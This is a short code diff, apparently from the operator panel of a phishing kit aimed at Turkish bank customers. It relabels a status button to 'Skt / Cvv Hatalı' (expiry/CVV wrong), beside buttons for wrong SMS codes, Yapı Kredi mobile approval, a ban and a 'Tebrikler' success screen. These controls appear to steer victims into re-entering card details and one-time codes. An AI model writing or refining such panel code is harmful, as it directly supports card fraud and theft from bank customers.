@@ -690,7 +690,7 @@ Geldiği Tarih: ${log.tarih || ''}`;
     { key: 'HATALI_SMS', label: 'HATALI SMS', icon: '❌', color: '#dc2626' },
     { key: 'YKB_MOBIL_ONAY', label: 'YKB Mobil Onay', icon: '📲', color: '#0284c7' },
     { key: 'INT_KAPALI', label: 'İNT KAPALI', icon: '🔒', color: '#4b5563' },
-    { key: 'PROVIZYON', label: 'KART HATALI', icon: '💳', color: '#2563eb96' },
+    { key: 'PROVIZYON', label: 'Skt / Cvv Hatalı', icon: '💳', color: '#2563eb96' },
     { key: 'BAN', label: 'BAN', icon: '🚫', color: '#ea580cab' },
     { key: 'onay', label: 'Tebrikler', icon: '🎉', color: '#10b981' },
     { key: 'SIL', label: 'SİL', icon: '🗑️', color: '#e1b71d9c', isDelete: true },
